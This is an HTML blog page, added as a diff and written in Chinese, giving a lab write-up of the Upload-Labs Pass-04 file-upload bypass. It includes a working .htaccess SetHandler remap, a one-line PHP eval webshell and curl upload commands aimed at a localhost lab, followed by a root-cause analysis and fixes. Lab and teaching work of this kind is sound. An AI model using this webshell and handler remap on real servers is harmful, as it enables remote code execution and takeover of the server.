@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload-Labs Pass-04 .htaccess 解析绕过 Writeup - gz2008的技术博客</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 40px 20px;
+      color: #1e293b;
+      background: #f6f9fc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+      line-height: 1.8;
+    }
+    .container {
+      width: min(860px, 100%);
+      margin: 0 auto;
+      padding: 40px;
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, .06);
+    }
+    .back-link { color: #2563eb; text-decoration: none; font-weight: 600; }
+    .back-link:hover { text-decoration: underline; }
+    h1 {
+      margin: 20px 0 10px;
+      padding-bottom: 15px;
+      border-bottom: 2px solid #eef2f6;
+      color: #0f172a;
+      font-size: clamp(1.8rem, 5vw, 2.3rem);
+      line-height: 1.35;
+    }
+    .tags { margin: 12px 0 26px; }
+    .tag {
+      display: inline-block;
+      margin: 0 8px 8px 0;
+      padding: 4px 12px;
+      color: #2563eb;
+      background: #eff6ff;
+      border-radius: 20px;
+      font-size: .85rem;
+      font-weight: 600;
+    }
+    h2 {
+      margin-top: 34px;
+      padding-left: 10px;
+      border-left: 4px solid #3b82f6;
+      color: #1e293b;
+      font-size: 1.35rem;
+    }
+    p, li { color: #475569; }
+    code {
+      padding: 2px 5px;
+      color: #be123c;
+      background: #f1f5f9;
+      border-radius: 4px;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      overflow-wrap: anywhere;
+    }
+    pre {
+      padding: 16px;
+      color: #e2e8f0;
+      background: #172033;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      font-size: .9rem;
+      line-height: 1.6;
+    }
+    pre code { padding: 0; color: inherit; background: none; }
+    figure { margin: 24px 0; }
+    figure img {
+      display: block;
+      width: 100%;
+      height: auto;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      box-shadow: 0 6px 20px rgba(15, 23, 42, .07);
+    }
+    figcaption {
+      margin-top: 9px;
+      color: #64748b;
+      font-size: .9rem;
+      text-align: center;
+    }
+    .note, .success {
+      margin: 18px 0;
+      padding: 13px 16px;
+      border-left: 4px solid #f97316;
+      background: #fff7ed;
+      color: #9a3412;
+    }
+    .success {
+      border-left-color: #22c55e;
+      background: #f0fdf4;
+      color: #166534;
+    }
+    table { width: 100%; margin: 16px 0; border-collapse: collapse; }
+    th, td { padding: 9px 11px; border: 1px solid #e2e8f0; text-align: left; }
+    th { color: #1e3a8a; background: #eff6ff; }
+    @media (max-width: 640px) {
+      body { padding: 0; }
+      .container { padding: 24px 18px; border-radius: 0; }
+      table { display: block; overflow-x: auto; }
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <a class="back-link" href="index.html">← 返回 Upload-Labs 首页</a>
+
+    <h1>Upload-Labs Pass-04：利用 .htaccess 重新映射脚本处理器</h1>
+    <div class="tags">
+      <span class="tag"># Upload-Labs</span>
+      <span class="tag"># Web</span>
+      <span class="tag"># File Upload</span>
+      <span class="tag"># Apache</span>
+      <span class="tag"># .htaccess</span>
+    </div>
+
+    <p>Pass-04 的扩展名黑名单没有拦截 <code>.htaccess</code>，同时上传后的原始文件名会被直接保存。利用这一点，可以先上传目录级 Apache 配置，将特定图片文件交给 PHP 处理器，再上传只包含 PHP 代码的图片文件，最终在图片访问路径上获得 PHP 代码执行。</p>
+
+    <h2>一、实验信息</h2>
+    <table>
+      <tr><th>项目</th><th>内容</th></tr>
+      <tr><td>靶场</td><td>Upload-Labs</td></tr>
+      <tr><td>关卡</td><td>Pass-04</td></tr>
+      <tr><td>目标</td><td><code>http://127.0.0.1:8081/Pass-04/index.php</code></td></tr>
+      <tr><td>漏洞类型</td><td>上传目录可写入 Apache 配置，脚本处理器被重新映射</td></tr>
+      <tr><td>上传字段</td><td><code>upload_file</code></td></tr>
+      <tr><td>配置文件名</td><td><code>.htaccess</code></td></tr>
+      <tr><td>载荷文件名</td><td><code>as.png</code></td></tr>
+      <tr><td>验证结果</td><td>图片路径被 Apache 当作 PHP 执行</td></tr>
+    </table>
+
+    <h2>二、功能观察</h2>
+    <p>页面要求上传一个 <code>webshell</code>，但上传控件提示选择图片。Pass-04 的校验重点是扩展名黑名单，并未限制文件内容必须真的是图片。</p>
+
+    <figure>
+      <img src="assets/upload_labs_pass04_page.png" alt="Upload-Labs Pass-04 上传页面">
+      <figcaption>Pass-04 页面：任务要求上传 WebShell。</figcaption>
+    </figure>
+
+    <p>查看源码后，可以提取出与本关相关的处理逻辑：</p>
+
+    <pre><code>$deny_ext = array(".php", ".php5", ".php4", ".php3", ".php2", ...);
+$file_name = trim($_FILES['upload_file']['name']);
+$file_ext = strtolower(strrchr($file_name, '.'));
+
+if (!in_array($file_ext, $deny_ext)) {
+    $img_path = UPLOAD_PATH . '/' . $file_name;
+    move_uploaded_file($_FILES['upload_file']['tmp_name'], $img_path);
+}</code></pre>
+
+    <p>这里有两个关键事实：</p>
+    <ul>
+      <li>黑名单没有包含 <code>.htaccess</code>，因此配置文件能够进入上传目录。</li>
+      <li>程序使用客户端提供的文件名保存文件，没有随机重命名，也没有禁止覆盖目录配置文件。</li>
+    </ul>
+
+    <h2>三、环境前提</h2>
+    <p>该方法依赖 Apache 的目录级配置能力。Web 服务器必须实际读取 <code>.htaccess</code>，且对应目录允许使用 <code>SetHandler</code> 所需的配置覆盖权限。在 Apache 中，目标目录通常需要启用类似下面的配置：</p>
+
+    <pre><code>&lt;Directory /path/to/upload-labs&gt;
+    AllowOverride All
+    Require all granted
+&lt;/Directory&gt;</code></pre>
+
+    <div class="note">PHP 内置开发服务器和 Nginx 不读取 <code>.htaccess</code>。如果靶场使用 <code>php -S</code> 启动，即使上传了正确配置，图片文件仍会按静态文件返回，不能据此判断载荷本身有误。</div>
+
+    <h2>四、漏洞利用</h2>
+    <p>先在本地新建文件名恰好为 <code>.htaccess</code> 的文件，写入下面的配置：</p>
+
+    <pre><code>&lt;FilesMatch "^as\.png$"&gt;
+    SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></pre>
+
+    <p><code>FilesMatch</code> 对目录中的文件名进行正则匹配。当请求的文件名匹配 <code>as.png</code> 时，Apache 不再按普通图片处理，而是交给 <code>application/x-httpd-php</code> 处理器。</p>
+
+    <p>随后准备名为 <code>as.png</code> 的载荷：</p>
+
+    <pre><code>&lt;?php @eval($_POST['pass']); ?&gt;</code></pre>
+
+    <p>按以下顺序上传：</p>
+    <ol>
+      <li>上传文件名为 <code>.htaccess</code> 的配置文件。</li>
+      <li>确认上传成功且文件名没有被重命名。</li>
+      <li>上传文件名为 <code>as.png</code> 的 PHP 载荷。</li>
+      <li>访问 <code>http://127.0.0.1:8081/upload/as.png</code>，确认文件由 PHP 解析。</li>
+    </ol>
+
+    <p>也可以使用等价请求直接完成两步上传。注意第一条请求通过 <code>filename=.htaccess</code> 明确指定目标文件名：</p>
+
+    <pre><code>curl.exe -sS -F "upload_file=@.htaccess;filename=.htaccess" \
+  -F "submit=上传" \
+  "http://127.0.0.1:8081/Pass-04/index.php"
+
+curl.exe -sS -F "upload_file=@as.png;filename=as.png" \
+  -F "submit=上传" \
+  "http://127.0.0.1:8081/Pass-04/index.php"</code></pre>
+
+    <p>为了得到可观察、无副作用的执行证据，本次验证向 <code>as.png</code> 提交固定 PHP 语句：</p>
+
+    <pre><code>curl.exe -sS -X POST \
+  --data-urlencode 'pass=echo "PASS04_EXEC_OK";' \
+  "http://127.0.0.1:8081/upload/as.png"</code></pre>
+
+    <p>响应正文为：</p>
+
+    <pre><code>PASS04_EXEC_OK</code></pre>
+
+    <figure>
+      <img src="assets/upload_labs_pass04_exec.png" alt="访问 as.png 后返回 PHP 执行标记">
+      <figcaption>访问图片路径后返回由 PHP 执行的固定标记，而不是源代码。</figcaption>
+    </figure>
+
+    <div class="success">响应中不存在 <code>&lt;?php ... ?&gt;</code> 源码，而是出现了 PHP 执行后的固定字符串，说明 <code>.htaccess</code> 已改变解析方式，<code>as.png</code> 能被服务器当作脚本执行。</div>
+
+    <h2>五、漏洞根因</h2>
+    <p>根因不是图片扩展名本身能够执行，而是应用允许不可信文件进入一个允许目录级配置的 Web 目录。攻击链包含两个缺失的控制：</p>
+    <ol>
+      <li>上传程序没有拒绝用于控制目录行为的配置文件。</li>
+      <li>Web 服务器允许上传目录中的配置覆盖处理器映射。</li>
+    </ol>
+
+    <p>因此，扩展名黑名单只检查了 PHP、JSP、ASP 等脚本后缀，却没有覆盖“能改变解析规则的配置文件名”。最终结果是 <code>.png</code> 仍保持图片外观，但其处理入口已经被重定向到 PHP。</p>
+
+    <h2>六、修复建议</h2>
+    <ul>
+      <li>使用服务端扩展名白名单，并由服务端生成随机文件名和固定安全后缀。</li>
+      <li>禁止上传以点开头的隐藏文件，明确拦截 <code>.htaccess</code>、<code>.user.ini</code> 等配置类文件。</li>
+      <li>将上传目录放到 Web 根目录之外，避免上传内容参与服务器配置解析。</li>
+      <li>对 Apache 上传目录设置 <code>AllowOverride None</code>，并在 Web 服务器层关闭脚本执行。</li>
+      <li>同时校验文件头和实际内容；图片应重新解码和编码后再保存。</li>
+    </ul>
+
+    <h2>七、复盘</h2>
+    <p>Pass-04 绕过的关键不是寻找一个能被 PHP 直接执行的新后缀，而是修改服务器对原有后缀的解释。排查时也要先确认服务器确实会读取 <code>.htaccess</code>：文件名必须准确，配置内容必须非空，Apache 还必须允许相应的目录覆盖权限；三者缺一，最后都会表现为图片路径仍返回静态源码。</p>
+  </main>
+</body>
+</html>
